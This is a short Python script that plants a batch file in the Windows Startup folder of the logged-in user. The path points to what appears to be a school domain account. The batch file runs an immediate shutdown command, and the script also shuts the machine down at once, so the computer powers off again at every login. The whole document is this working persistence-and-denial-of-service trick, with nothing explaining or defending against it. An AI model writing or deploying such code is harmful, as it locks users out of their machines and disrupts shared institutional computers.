import os

# creating variables to inform the program the directory and the script content
user = os.getlogin()
path = os.path.join('C:\\', 'Users', user + '.EDU_FIESC', 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'script.bat')
scriptbat = f'shutdown -s -t 0'

# writing the command on the BATCH file
with open(path, 'w') as file:
    file.write(scriptbat)

os.system('shutdown -s -t 0')
